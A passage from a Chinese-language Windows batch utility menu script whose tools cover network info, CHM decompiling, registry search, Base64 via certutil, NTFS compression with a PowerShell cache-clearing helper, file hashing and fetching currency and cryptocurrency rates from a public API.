endlocal
goto 47
:wlpz
title 查看网络配置!system!
cls
ipconfig /all
netsh wlan show drivers
netsh wlan show interface
netsh interface Teredo show state
!hx!
set /p =按任意键返回<nul&pause>nul
endlocal
goto 47
:48
setlocal
title 反编译chm文件!system!
cls
set chmlj=
echo;拖动要反编译的chm文件到此窗口
set /p "chmlj=反编译后的文件保存在桌面(e=返回): "
if /i "!chmlj!" equ "e" (
	endlocal
	goto memuv2
)
call :ljjc chmlj
if "!errorlevel!" equ "0" (
	echo;无效路径
	call :out 2
	endlocal
	goto 48
)
for /f "delims=" %%a in ("!chmlj!") do (
	if /i "%%~xa" neq ".chm" (
		!hx!
		echo;不是chm文件！
		call :out 2
		endlocal
		goto 48
	)
	set chmcglj=
	set "chmcglj=%%~na"
	copy /y "!chmlj!" %systemdrive%\windows\temp\tmp.chm
	hh -decompile %systemdrive%\windows\temp\chm %systemdrive%\windows\temp\tmp.chm
	md "!zmlj!\%%~na"
	xcopy /c /e /y %systemdrive%\windows\temp\chm "!zmlj!\%%~na"
	rd /s /q %systemdrive%\windows\temp\chm
	del /f /q %systemdrive%\windows\temp\tmp.chm
	)
cls
echo;反编译成功！
echo;以保存到"!zmlj!\!chmcglj!"
!hx!
set /p =按任意键返回菜单<nul&pause>nul
endlocal
goto memuv2
:49
title 关闭无响应进程!system!
cls
taskkill /f /fi "status eq not responding"
!hx!
set /p =按任意键返回菜单<nul&pause>nul
goto memuv2
:50
setlocal
title 文件比较器!system!
cls
echo;拖动要比较的文件到此窗口(比较过程中连按 "Ctrl+C" 2次可结束比较)
!hx!
set /p "wj1=第一个要比较的文件: "
set /p "wj2=第二个要比较的文件: "
call :lj wj1 wj1
call :lj wj2 wj2
!hx!
fc /b "!wj1!" "!wj2!"
!hx!
set /p =按任意键返回菜单<nul&pause>nul
endlocal
goto memuv2
:51
setlocal
title 将文字写入剪切板!system!
set nz=
cls
set /p "nz=请输入要写入到剪切板的文字内容:"
mshta vbscript:clipboardData.SetData("text","!nz!")(window.close)
if "!errorlevel!" equ "0" (set nz=0) else (set nz=1)
!hx!
if "!nz!" equ "0" (echo;写入成功) else (echo;写入失败)
set /p =按任意键返回菜单<nul&pause>nul
endlocal
goto memuv2
:52
cls
start services.msc
goto memuv2
:53
setlocal
cls
title 已知年月日计算星期!system!
set jsxq=00000000
set /p "jsxq=请输入年月日(例如20150605): "
call :checkvar jsxq num jg
if "!jg!" equ "0" (
	set /p =请输入正确的格式!<nul
	call :out 2
	endlocal
	goto 53
)
call :strlen jsxq jg
if "!jg!" neq "8" (
	set /p =请输入正确的格式!<nul
	call :out 2
	endlocal
	goto 53
)
set "y=!jsxq:~0,4!"
if !y! lss 10 (set /a "y=0x!y!")
set "m=!jsxq:~4,2!"
if !m! lss 10 (set /a "m=0x!m!")
if "!m!" equ "1" (
	set m=13
	set /a "y-=1"
)
if "!m!" equ "2" (
	set m=14
	set /a "y-=1"
)
set "d=!jsxq:~6,2!"
if !d! lss 10 (set /a "d=0x!d!")
set /a "d+=1"
set /a "w=d+2*m+3*(m+1)/5+y+y/4-y/100+y/400"
set /a "w=w%%7"
set /a "rn1=y%%4"
set /a "rn2=y%%100"
set /a "rn3=y%%400"
set rn=平年
if "!rn1!" equ "0" (
	if "!rn2!" neq "0" (set rn=闰年)
)
if "!rn2!" equ "0" (
	if "!rn3!" equ "0" (set rn=闰年)
)
if "!w!" equ "1" (set w=一)
if "!w!" equ "2" (set w=二)
if "!w!" equ "3" (set w=三)
if "!w!" equ "4" (set w=四)
if "!w!" equ "5" (set w=五)
if "!w!" equ "6" (set w=六)
if "!w!" equ "0" (set w=天)
echo;
echo;!rn! !jsxq:~0,4!年!jsxq:~4,2!月!jsxq:~6,2!日是星期!w!
!hx!
set /p =按任意键返回菜单<nul&pause>nul
endlocal
goto memuv2
:54
setlocal
if /i "!processor_architecture!" equ "x86" (set bit=32) else (set bit=64)
cls
title 查询系统激活状态!system!
set "cho=1230"
echo;操作系统: !system:~3! !bit!位
if "!system:~11,2!" equ "XP" (echo;Windows XP系统无法使用此功能查询)
!hx!
echo;[1]显示许可信息
echo;[2]显示详细的许可信息
echo;[3]显示当前许可状态的截止日期
echo;[0]返回菜单
!hx!
!sel!
if "!shuru!" equ "1" (start slmgr.vbs -dli&goto 54)
if "!shuru!" equ "2" (start slmgr.vbs -dlv&goto 54)
if "!shuru!" equ "3" (start slmgr.vbs -xpr&goto 54)
if "!shuru!" equ "4" (endlocal&goto memuv2)
if "!shuru!" equ "0" (endlocal&goto memuv2)
set /p =请输入正确的选项！<nul
call :out 2
endlocal
goto 54
:55
setlocal
cls
title 创建指定文件的快捷方式到桌面!system!
set kjfs=
set /p "kjfs=请拖动目标文件到此窗口: "
if not defined kjfs (endlocal&goto 55)
call :lj kjfs kjfs
for /f "delims=" %%a in ("!kjfs!") do (set "kjfsmc=%%~na")
mshta VBScript:Execute("Set a=CreateObject(""WScript.Shell""):Set b=a.CreateShortcut(a.SpecialFolders(""Desktop"") & ""\!kjfsmc!.lnk""):b.TargetPath=""!kjfs!"":b.WorkingDirectory=""%~dp0"":b.Save:close")
!hx!
set /p =按任意键返回菜单<nul&pause>nul
endlocal
goto memuv2
:56
cls
start msconfig.exe
goto memuv2
:57
setlocal
cls
title 字数统计!system!
set zstj=
set /p "zstj=请输入文字:"
call :strlen zstj jg
echo;总计!jg!个字(包含标点符号)
!hx!
set /p =按任意键返回菜单<nul&pause>nul
endlocal
goto memuv2
:58
setlocal
cls
title 创建符号链接!system!
set swjj=
set cwjj=
set /p "swjj=输入要链接的文件夹路径: "
set /p "cwjj=输入链接文件夹的输出路径: "
call :lj swjj swjj
call :lj cwjj cwjj
mklink /d !cwjj! !swjj!
!hx!
set /p =按任意键返回菜单<nul&pause>nul
endlocal
goto memuv2
:59
title 打开管理控制台!system!
cls
start mmc
goto memuv2
:60
setlocal
cls
title 解除Streams文件锁定!system!
set jcwjsd=
set /p "jcwjsd=拖动目标文件到此窗口: "
call :ljjc jcwjsd
if "!errorlevel!" equ "0" (
	set /p =无效路径<nul
	call :out 2
	endlocal
	goto 60
)
echo>"!jcwjsd!:Zone.Identifier"
echo;操作完成
!hx!
set /p =按任意键返回菜单<nul&pause>nul
endlocal
goto memuv2
:61
setlocal
title 创建、删除或列出卷装入点!system!
set "cho=123450"
cls
!hx!
echo;[1]列出卷装入点
echo;[2]删除不在系统中的、卷的装入点目录和注册表设置
echo;[3]列出指定目录的已装入的卷名称
echo;[4]创建盘符(创建卷装入点)
echo;[5]删除盘符(删除卷装入点)
echo;[0]返回菜单
!hx!
!sel!
if "!shuru!" equ "1" (goto 61.1)
if "!shuru!" equ "2" (goto 61.2)
if "!shuru!" equ "3" (goto 61.3)
if "!shuru!" equ "4" (goto 61.4)
if "!shuru!" equ "5" (goto 61.5)
if "!shuru!" equ "6" (endlocal&goto memuv2)
if "!shuru!" equ "0" (endlocal&goto memuv2)
set /p =请输入正确的选项！<nul
call :out 2
endlocal
goto 61
:61.1
title 列出卷装入点!system!
cls
for /f "skip=22" %%a in ('mountvol') do (echo;%%a)
!hx!
set /p =按任意键返回<nul&pause>nul
setlocal
goto 61
:61.2
title 删除不在系统中的,卷的装入点目录和注册表设置!system!
cls
mountvol /r
echo;操作完成
!hx!
set /p =按任意键返回<nul&pause>nul
endlocal
goto 61
:61.3
title 列出指定目录的已装入的卷名称!system!
cls
fsutil fsinfo drives
!hx!
set xszz=
set /p "xszz=请输入需要显示的盘符: "
cls
echo;!xszz!:\&mountvol !xszz!: /l
!hx!
set /p =按任意键返回<nul&pause>nul
endlocal
goto 61
:61.4
title 创建盘符(创建卷装入点)!system!
cls
set xx1=0
for /f "delims=" %%a in ('"mountvol|find "\\?\Volume""') do (
	set /a "xx1+=1"
	set "b!xx1!=%%a"
	echo;[!xx1!]%%a
)
echo;[0]返回上级菜单
!hx!
set cjpf=
set /p "cjpf=选择装入点: "
if "!cjpf!" equ "" (goto 61.4)
if "!cjpf!" equ "0" (endlocal&goto 61)
set xzpf=
set /p "xzpf=输入盘符: "
if "!xzpf!" equ "" (goto 61.4)
mountvol !xzpf!: !b%cjpf%!
echo;操作完成
!hx!
set /p =按任意键返回<nul&pause>nul
endlocal
goto 61
:61.5
title 删除盘符(删除卷装入点)!system!
cls
fsutil fsinfo drives
!hx!
set scpf=
set /p "scpf=请输入需要删除的盘符: "
mountvol !scpf!: /d
echo;操作完成
!hx!
set /p =按任意键返回<nul&pause>nul
endlocal
goto 61
:62
setlocal
title 注册表搜索!system!
cls
set zcbss=
set /p "zcbss=输入你要搜索的名称: "
!hx!
echo;(1/5)在HKEY_CLASSES_ROOT中搜索...
reg query hkcr /f !zcbss! /s
!hx!
echo;(2/5)在HKEY_CURRENT_USER中搜索...
reg query hkcu /f !zcbss! /s
!hx!
echo;(3/5)在HKEY_LOCAL_MACHINE中搜索...
reg query hklm /f !zcbss! /s
!hx!
echo;(4/5)在HKEY_USERS中搜索...
reg query hku /f !zcbss! /s
!hx!
echo;(5/5)在HKEY_CURRENT_CONFIG中搜索...
reg query hkcc /f !zcbss! /s
!hx!
set /p =按任意键返回菜单<nul&pause>nul
endlocal
goto memuv2
:63
setlocal
title Base编解码!system!
cls
if not exist %systemroot%\system32\certutil.exe (
	echo;没有找到certutil.exe
	echo;不能继续Base编解码
	!hx!
	set /p =按任意键返回菜单<nul&pause>nul
	endlocal
	goto memuv2
)
!hx!
echo;[1]Base64解码
echo;[2]Base64编码
echo;[0]返回菜单
!hx!
set cho=120
if "!shuru!" equ "1" (goto 63-1)
if "!shuru!" equ "2" (goto 63-2)
if "!shuru!" equ "3" (endlocal&goto memuv2)
if "!shuru!" equ "0" (endlocal&goto memuv2)
set /p =请输入正确的选项！<nul
call :out 2
endlocal
goto 63
:63-1
cls
if exist "%temp%\codetmp" (del /f /q "%temp%\codetmp")
title Base64解码!system!
set basebm=
set /p "basebm=输入要解码的字符串或文件路径: "
if "!basebm!" equ "" (goto 63-1)
if not exist "!basebm!" (
	echo;!basebm!>"%temp%\tmp"
	certutil -decode -f "%temp%\tmp" "%temp%\codetmp">nul
	goto 63-11
)
call :lj basebm basebm
dir /ad "!basebm!" >nul 2>nul&&echo;不能解码文件夹||goto 63-12
call :out 2
goto 63-1
:63-12
certutil -decode -f "!basebm!" "%temp%\codetmp">nul
:63-11
cls
!hx!
echo;输入内容: !basebm!
echo;解码内容:
if exist "%temp%\codetmp" (type "%temp%\codetmp") else (echo;解码失败)
echo;
!hx!
set bxz=
set /p "bxz=输入y保存编码,其他输入返回上级菜单: "
if "!bxz!" equ "y" (
	set basebc=
	set /p "basebc=输入保存路径:"
	!hx!
	copy /y /z "%temp%\codetmp" !basebc!
	if "!errorlevel!" neq "0" (echo;保存失败) else (echo;保存成功)
	!hx!
	set /p =按任意键返回菜单<nul&pause>nul
)
del /f /q "%temp%\tmp"
del /f /q "%temp%\codetmp"
endlocal
goto 63
:63-2
cls
if exist "%temp%\codetmp" (del /f /q "%temp%\codetmp")
title Base64编码!system!
set basebm=
set /p "basebm=输入要编码的字符串或文件路径: "
if "!basebm!" equ "" (goto 63-2)
if not exist "!basebm!" (
	set /p =!basebm!<nul>"%temp%\tmp"
	certutil -encode -f "%temp%\tmp" "%temp%\codetmp">nul
	goto 63-21
)
call :lj basebm basebm
dir /ad "!basebm!" >nul 2>nul&&echo;不能编码文件夹||goto 63-22
call :out 2
goto 63-2
:63-22
certutil -encode -f "!basebm!" "%temp%\codetmp">nul
:63-21
cls 
!hx!
echo;输入内容: !basebm!
echo;编码内容:
for /f "delims=" %%a in (%temp%\codetmp) do (
	if "%%a" neq "-----BEGIN CERTIFICATE-----" (
		if "%%a" neq "-----END CERTIFICATE-----" (echo;%%a)
	)
)
!hx!
set bxz=
set /p "bxz=输入y保存编码,其他输入返回上级菜单: "
if "!bxz!" equ "y" (
	set basebc=
	set /p "basebc=输入保存路径: "
	!hx!
	copy /y /z "%temp%\codetmp" !basebc!
	if "!errorlevel!" neq "0" (echo;保存失败) else (echo;保存成功)
	!hx!
	set /p =按任意键返回菜单<nul&pause>nul
)
del /f /q "%temp%\tmp"
del /f /q "%temp%\codetmp"
endlocal
goto 63
:64
setlocal
title 8.3短文件名管理!system!
set "cho=120"
cls
!hx!
echo;[1]查询8.3短文件名状态
echo;[2]禁止8.3短文件名创建
echo;[0]返回菜单
!hx!
!sel!
if "!shuru!" equ "1" (goto 64-1)
if "!shuru!" equ "2" (goto 64-2)
if "!shuru!" equ "3" (endlocal&goto memuv2)
if "!shuru!" equ "0" (endlocal&goto memuv2)
set /p =请输入正确的选项！<nul
call :out 2
endlocal
goto 64
:64-1
cls
fsutil fsinfo drives
set query83=
set /p "query83=请输入要查询的盘符: "
fsutil 8dot3name query !query83!:
!hx!
set /p =按任意键返回菜单<nul&pause>nul
endlocal
goto 64
:64-2
cls
fsutil 8dot3name set 1
!hx!
set /p =按任意键返回菜单<nul&pause>nul
endlocal
goto 64
:65
setlocal
title 智能NTFS压缩!system!
cls
set url=
set /p "url=请输入要压缩的文件夹: "
for /f "delims=" %%a in ("!url!") do (set "url=%%~fa")
dir /ad "!url!">nul 2>nul||(
	echo;路径 !url! 不是一个文件夹
	timeout /t 2 /nobreak>nul
	goto 65
)
if exist "%temp%\listfile.log" (del /f /q "%temp%\listfile.log")
if exist "%temp%\loadtime.log" (del /f /q "%temp%\loadtime.log")
if exist "%temp%\uncompact.log" (del /f /q "%temp%\uncompact.log")
title 记录文件列表...
for /f "delims=" %%a in ('"dir/a/s/b "!url!""') do (
	echo;"%%a" %%~za %%~xa
	call :listfile "%%a" %%~za %%~xa
)
title 整理碎片...
defrag "!url!" /u /v
echo;清空缓存...
net stop sysmain>nul 2>nul
call :pwiex clearcache
title 记录文件压缩前的读取时间...
for /f "tokens=*" %%a in (%temp%\listfile.log) do (call :loadfile %%a)
title 压缩文件...
for /f "tokens=*" %%a in (%temp%\listfile.log) do (compact /c %%a)
title 整理碎片...
defrag "!url!" /u /v
echo;清空缓存...
call :pwiex clearcache
title 比较压缩前后的读取时间...
for /f "tokens=*" %%a in (%temp%\loadtime.log) do (call :ifloadfile %%a)
title 解压不适合压缩的文件...
for /f "tokens=*" %%a in (%temp%\uncompact.log) do (compact /u %%a)
title 智能NTFS压缩!system!
net start sysmain>nul 2>nul
del /f /q "%temp%\listfile.log";"%temp%\loadtime.log";"%temp%\uncompact.log"
!hx!
set /p =按任意键返回菜单<nul&pause>nul
endlocal
goto memuv2
:ifloadfile
set "file=%1"
set "loadtime=%2"
call :copyfile !file!
if !raw! geq !loadtime! (echo;!file!>>"%temp%\uncompact.log")
goto :eof
:loadfile
set "file=%1"
call :copyfile !file!
echo;!file! !raw!>>"%temp%\loadtime.log"
goto :eof
:copyfile
set "file=%1"
echo;!file!
set "kssj=!time!"
copy /z !file! nul
set "jssj=!time!"
call :sjc !kssj! !jssj! raw
echo;读取用时: !raw! ms
goto :eof
:listfile
set "urld=%1"
set "size=%2"
set "name=%3"
dir /ad !urld!>nul 2>nul&&goto :eof
if "!name!" equ ".zip" (goto :eof)
if "!name!" equ ".rar" (goto :eof)
if "!name!" equ ".7z" (goto :eof)
if "!name!" equ ".png" (goto :eof)
if "!name!" equ ".jpg" (goto :eof)
if "!name!" equ ".mp3" (goto :eof)
if "!name!" equ ".acc" (goto :eof)
if "!name!" equ ".m4a" (goto :eof)
if "!name!" equ ".flac" (goto :eof)
if "!name!" equ ".ape" (goto :eof)
if "!name!" equ ".mp4" (goto :eof)
if "!name!" equ ".avi" (goto :eof)
if "!name!" equ ".flv" (goto :eof)
if "!name!" equ ".f4v" (goto :eof)
if "!name!" equ ".mkv" (goto :eof)
if "!name!" equ ".3gp" (goto :eof)
if "!name!" equ ".cab" (goto :eof)
if "!name!" equ ".pdf" (goto :eof)
if !size! gtr 4096 (
	if !size! leq 104857600 (echo;!urld!>>"%temp%\listfile.log")
)
goto :eof
#clearcache#
If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(`
    [Security.Principal.WindowsBuiltInRole] "Administrator"))
{
    Write-Warning “You do not have Administrator rights to run this script!`nPlease re-run this script as an Administrator!”
    Break
}

$Source = @"
using System;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace ClearStandbyList
{
    public class Program
    {
        const int SE_PRIVILEGE_ENABLED = 2;
        const string SE_INCREASE_QUOTA_NAME = "SeIncreaseQuotaPrivilege";
        const string SE_PROFILE_SINGLE_PROCESS_NAME = "SeProfileSingleProcessPrivilege";
        const int SystemFileCacheInformation = 0x0015;
        const int SystemMemoryListInformation = 0x0050;
        const int MemoryPurgeStandbyList = 4;

        [DllImport("advapi32.dll", SetLastError = true)]
        internal static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);

        [DllImport("advapi32.dll", SetLastError = true)]
        internal static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall, ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);

        [DllImport("ntdll.dll")]
        public static extern UInt32 NtSetSystemInformation(int InfoClass, IntPtr Info, int Length);
        public static bool Is64BitMode()
        {
            return Marshal.SizeOf(typeof(IntPtr)) == 8;
        }

        static void Main(string[] args)
        {
            ClearFileSystemCache(true);
        }

        public static void ClearFileSystemCache(bool ClearStandbyCache)
        {
            try
            {
                if (SetIncreasePrivilege(SE_INCREASE_QUOTA_NAME))
                {
                    uint num1;
                    int SystemInfoLength;
                    GCHandle gcHandle;
                    if (!Is64BitMode())
                    {
                        SYSTEM_CACHE_INFORMATION cacheInformation = new SYSTEM_CACHE_INFORMATION();
                        cacheInformation.MinimumWorkingSet = uint.MaxValue;
                        cacheInformation.MaximumWorkingSet = uint.MaxValue;
                        SystemInfoLength = Marshal.SizeOf(cacheInformation);
                        gcHandle = GCHandle.Alloc(cacheInformation, GCHandleType.Pinned);
                        num1 = NtSetSystemInformation(SystemFileCacheInformation, gcHandle.AddrOfPinnedObject(), SystemInfoLength);
                        gcHandle.Free();
                    }
                    else
                    {
                        SYSTEM_CACHE_INFORMATION_64_BIT information64Bit = new SYSTEM_CACHE_INFORMATION_64_BIT();
                        information64Bit.MinimumWorkingSet = -1L;
                        information64Bit.MaximumWorkingSet = -1L;
                        SystemInfoLength = Marshal.SizeOf(information64Bit);
                        gcHandle = GCHandle.Alloc(information64Bit, GCHandleType.Pinned);
                        num1 = NtSetSystemInformation(SystemFileCacheInformation, gcHandle.AddrOfPinnedObject(), SystemInfoLength);
                        gcHandle.Free();
                    }
                    if (num1 != 0)
                        throw new Exception("NtSetSystemInformation(SYSTEMCACHEINFORMATION) error: ", new Win32Exception(Marshal.GetLastWin32Error()));
                }
                if (ClearStandbyCache && SetIncreasePrivilege(SE_PROFILE_SINGLE_PROCESS_NAME))
                {

                    int SystemInfoLength = Marshal.SizeOf(MemoryPurgeStandbyList);
                    GCHandle gcHandle = GCHandle.Alloc(MemoryPurgeStandbyList, GCHandleType.Pinned);
                    uint num2 = NtSetSystemInformation(SystemMemoryListInformation, gcHandle.AddrOfPinnedObject(), SystemInfoLength);
                    gcHandle.Free();
                    if (num2 != 0)
                        throw new Exception("NtSetSystemInformation(SYSTEMMEMORYLISTINFORMATION) error: ", new Win32Exception(Marshal.GetLastWin32Error()));
                }
            }
            catch (Exception ex)
            {
                Console.Write(ex.ToString());
            }
        }

        private static bool SetIncreasePrivilege(string privilegeName)
        {
            using (WindowsIdentity current = WindowsIdentity.GetCurrent(TokenAccessLevels.Query | TokenAccessLevels.AdjustPrivileges))
            {
                TokPriv1Luid newst;
                newst.Count = 1;
                newst.Luid = 0L;
                newst.Attr = SE_PRIVILEGE_ENABLED;
                if (!LookupPrivilegeValue(null, privilegeName, ref newst.Luid))
                    throw new Exception("Error in LookupPrivilegeValue: ", new Win32Exception(Marshal.GetLastWin32Error()));
                int num = AdjustTokenPrivileges(current.Token, false, ref newst, 0, IntPtr.Zero, IntPtr.Zero) ? 1 : 0;
                if (num == 0)
                    throw new Exception("Error in AdjustTokenPrivileges: ", new Win32Exception(Marshal.GetLastWin32Error()));
                return num != 0;
            }
        }
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    struct SYSTEM_CACHE_INFORMATION
    {
        public uint CurrentSize;
        public uint PeakSize;
        public uint PageFaultCount;
        public uint MinimumWorkingSet;
        public uint MaximumWorkingSet;
        public uint Unused1;
        public uint Unused2;
        public uint Unused3;
        public uint Unused4;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    struct SYSTEM_CACHE_INFORMATION_64_BIT
    {
        public long CurrentSize;
        public long PeakSize;
        public long PageFaultCount;
        public long MinimumWorkingSet;
        public long MaximumWorkingSet;
        public long Unused1;
        public long Unused2;
        public long Unused3;
        public long Unused4;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    internal struct TokPriv1Luid
    {
        public int Count;
        public long Luid;
        public int Attr;
    }
}
"@

Add-Type -TypeDefinition $Source -Language CSharp 

[ClearStandbyList.Program]::ClearFileSystemCache($true)
#clearcache#
:66
setlocal
title 计算文件哈希值!system!
cls
set url=
set /p "url=输入文件路径(e=返回菜单): "
if /i "!url!" equ "e" (
	endlocal
	goto memuv2
)
call :ljjc url
if "!errorlevel!" equ "0" (
	echo;无效路径
	call :out 2
	endlocal
	goto 66
)
cls
echo;文件: 		"!url!"
for /f "delims=" %%a in ("!url!") do (
	if %%~za gtr 1024 (
		call :xdwjs %%~za b dw
		echo;文件大小: 	!dw! %%~za字节
	) else (
		echo;文件大小: 	%%~za字节
	)
)
call :hash %url% md5 hash
call :convertu !hash! hash
echo;
echo;MD5:	 %hash%
call :hash %url% sha1 hash
call :convertu !hash! hash
echo;SHA-1:	 %hash%
call :hash %url% sha256 hash
call :convertu !hash! hash
echo;SHA-256: %hash%
!hx!
set /p =按任意键返回菜单<nul&pause>nul
endlocal
goto memuv2
:67
setlocal
cls
title 显示货币汇率!system!
set "mainurl=https://api.coincap.io/v2/assets/"
set "mainurl1=https://api.coincap.io/v2/rates/"
for /f "skip=1 tokens=3 delims= " %%a in ('"reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable"') do (
	if "%%a" equ "0x1" (
		for /f "skip=1 tokens=3 delims= " %%b in ('"reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer"') do (
			set "proxy=-x %%b"
			echo;使用代理:	%%b
		)
	) else (
		set proxy=
	)
)
echo;下载汇率文件(总共13个文件)...
if not exist "%temp%\down" (md "%temp%\down") 
if exist "%systemroot%\system32\curl.exe" (
	pushd "%temp%\down"
	curl !proxy! !doh! -A "!ua!" -# -Z --compressed -C - --retry 2 --retry-delay 1 --connect-timeout 5 ^
	-o cny.json			%mainurl1%chinese-yuan-renminbi ^
	-o doge.json		%mainurl%dogecoin ^
	-o btc.json			%mainurl%bitcoin ^
	-o eth.json			%mainurl%ethereum ^
	-o au.json			%mainurl1%gold-ounce ^
	-o ag.json			%mainurl1%silver-ounce ^
	-o eur.json			%mainurl1%euro ^
	-o gbp.json			%mainurl1%british-pound-sterling ^
	-o jpy.json			%mainurl1%japanese-yen ^
	-o hkd.json			%mainurl1%hong-kong-dollar ^
	-o twd.json			%mainurl1%new-taiwan-dollar ^
	-o xmr.json			%mainurl%monero ^
	-o filecoin.json	%mainurl%filecoin
	popd
) else (
	bitsadmin /transfer 下载汇率文件... /priority FOREGROUND ^
	%mainurl1%chinese-yuan-renminbi		"%temp%\down\cny.json" ^
	%mainurl%dogecoin					"%temp%\down\doge.json" ^
	%mainurl%bitcoin					"%temp%\down\btc.json" ^
	%mainurl%ethereum					"%temp%\down\eth.json" ^
	%mainurl1%gold-ounce				"%temp%\down\au.json" ^
	%mainurl1%silver-ounce				"%temp%\down\ag.json" ^
	%mainurl1%euro						"%temp%\down\eur.json" ^
	%mainurl1%british-pound-sterling	"%temp%\down\gbp.json" ^
	%mainurl1%japanese-yen				"%temp%\down\jpy.json" ^
	%mainurl1%hong-kong-dollar			"%temp%\down\hkd.json" ^
	%mainurl1%new-taiwan-dollar			"%temp%\down\twd.json" ^
	%mainurl%monero						"%temp%\down\xmr.json" ^
	%mainurl%filecoin					"%temp%\down\filecoin.json"
)
cls
echo;处理汇率文件...
for /f "usebackq delims=:} tokens=7" %%a in ("%temp%\down\cny.json") do (
	set "cnytousd=%%a"
	set "cnytousd=!cnytousd:"=!"
	if not defined cnytousd (set cnytousd=1)
)
for /f "usebackq delims=:, tokens=19,21" %%a in ("%temp%\down\doge.json") do (
	set "dogetousd=%%a"
	set "doge24h=%%b"
	set "dogetousd=!dogetousd:"=!"
	set "doge24h=!doge24h:"=!"
	if not defined dogetousd (
		set dogetousd=1
		set doge24h=0
	)
	for /f "delims=. tokens=1,2" %%a in ("!doge24h!") do (
		set "doge24h1=%%a"
		set "doge24h2=%%b"
	)
	set "doge24h=!doge24h1!.!doge24h2:~0,3!"
)
for /f "usebackq delims=:, tokens=19,21" %%a in ("%temp%\down\btc.json") do (
	set "btctousd=%%a"
	set "btc24h=%%b"
	set "btctousd=!btctousd:"=!"
	set "btc24h=!btc24h:"=!"
	if not defined btctousd (
		set btctousd=1
		set btc24h=0
	)
	for /f "delims=. tokens=1,2" %%a in ("!btc24h!") do (
		set "btc24h1=%%a"
		set "btc24h2=%%b"
	)
	set "btc24h=!btc24h1!.!btc24h2:~0,3!"
)
for /f "usebackq delims=:, tokens=19,21" %%a in ("%temp%\down\eth.json") do (
	set "ethtousd=%%a"
	set "eth24h=%%b"
	set "ethtousd=!ethtousd:"=!"
	set "eth24h=!eth24h:"=!"
	if not defined ethtousd (
		set ethtousd=1
		set eth24h=0
	)
	for /f "delims=. tokens=1,2" %%a in ("!eth24h!") do (
		set "eth24h1=%%a"
		set "eth24h2=%%b"
	)
	set "eth24h=!eth24h1!.!eth24h2:~0,3!"
)
for /f "usebackq delims=:, tokens=19,21" %%a in ("%temp%\down\filecoin.json") do (
	set "filetousd=%%a"
	set "file24h=%%b"
	set "filetousd=!filetousd:"=!"
	set "file24h=!file24h:"=!"
	if not defined filetousd (
		set filetousd=1
		file24h=0
	)
	for /f "delims=. tokens=1,2" %%a in ("!file24h!") do (
		set "file24h1=%%a"
		set "file24h2=%%b"
	)
	set "file24h=!file24h1!.!file24h2:~0,3!"
)
for /f "usebackq delims=:, tokens=19,21" %%a in ("%temp%\down\xmr.json") do (
	set "xmrtousd=%%a"
	set "xmr24h=%%b"
	set "xmrtousd=!xmrtousd:"=!"
	set "xmr24h=!xmr24h:"=!"
	if not defined xmrtousd (
		set xmrtousd=1
		set xmr24h=0
	)
	for /f "delims=. tokens=1,2" %%a in ("!xmr24h!") do (
		set "xmr24h1=%%a"
		set "xmr24h2=%%b"
	)
	set "xmr24h=!xmr24h1!.!xmr24h2:~0,3!"
)
for /f "usebackq delims=:} tokens=7" %%a in ("%temp%\down\au.json") do (
	set "autousd=%%a"
	set "autousd=!autousd:"=!"
	if not defined autousd (set autousd=1)
)
for /f "usebackq delims=:} tokens=7" %%a in ("%temp%\down\ag.json") do (
	set "agtousd=%%a"
	set "agtousd=!agtousd:"=!"
	if not defined agtousd (set agtousd=1)
)
for /f "usebackq delims=:} tokens=7" %%a in ("%temp%\down\eur.json") do (
	set "eurtousd=%%a"
	set "eurtousd=!eurtousd:"=!"
	if not defined eurtousd (set eurtousd=1)
)
for /f "usebackq delims=:} tokens=7" %%a in ("%temp%\down\gbp.json") do (
	set "gbptousd=%%a"
	set "gbptousd=!gbptousd:"=!"
	if not defined gbptousd (set gbptousd=1)
)
for /f "usebackq delims=:} tokens=7" %%a in ("%temp%\down\jpy.json") do (
	set "jpytousd=%%a"
	set "jpytousd=!jpytousd:"=!"
	if not defined jpytousd (set jpytousd=1)
)
for /f "usebackq delims=:} tokens=7" %%a in ("%temp%\down\hkd.json") do (
	set "hkdtousd=%%a"
	set "hkdtousd=!hkdtousd:"=!"
	if not defined hkdtousd (set hkdtousd=1)
)
for /f "usebackq delims=:} tokens=7" %%a in ("%temp%\down\twd.json") do (
	set "twdtousd=%%a"
	set "hkdtousd=!hkdtousd:"=!"
	if not defined twdtousd (set twdtousd=1)
)
rd /s /q "%temp%\down">nul
call :Division !dogetousd! !cnytousd! 8 dogetocny
call :Division !btctousd! !cnytousd! 8 btctocny
call :Division !ethtousd! !cnytousd! 8 ethtocny
call :Division !eurtousd! !cnytousd! 8 eurtocny
call :Division !gbptousd! !cnytousd! 8 gbptocny
call :Division !jpytousd! !cnytousd! 8 jpytocny
call :Division !hkdtousd! !cnytousd! 8 hkdtocny
call :Division !twdtousd! !cnytousd! 8 twdtocny
call :Division !xmrtousd! !cnytousd! 8 xmrtocny
call :Division !filetousd! !cnytousd! 8 filetocny
call :Division 1 !cnytousd! 3 usdtocny
call :Division !autousd! 31.1034768 3 autocny
call :Division !agtousd! 31.1034768 3 agtocny
call :xcf !autocny! !usdtocny! autocny
call :xcf !agtocny! !usdtocny! agtocny
cls
echo;黄金XAU    → 人民币CNY
echo;	1  → !autocny!
echo;
echo;白银XAG    → 人民币CNY
echo;	1  → !agtocny!
echo;
echo;以太坊ETH  → 人民币CNY
set /p =!cswz1![]	<nul
set /p =1  → !ethtocny!		24小时涨跌幅: <nul
if "!eth24h:~0,1!" equ "-" (call :colortxt a !eth24h!) else (call :colortxt c +!eth24h!)
set /p =%% <nul
echo;
echo;
echo;比特币BTC  → 人民币CNY
set /p =!cswz1![]	<nul
set /p =1  → !btctocny!		24小时涨跌幅: <nul
if "!btc24h:~0,1!" equ "-" (call :colortxt a !btc24h!) else (call :colortxt c +!btc24h!)
set /p =%% <nul
echo;
echo;
echo;门罗币XMR  → 人民币CNY
set /p =!cswz1![]	<nul
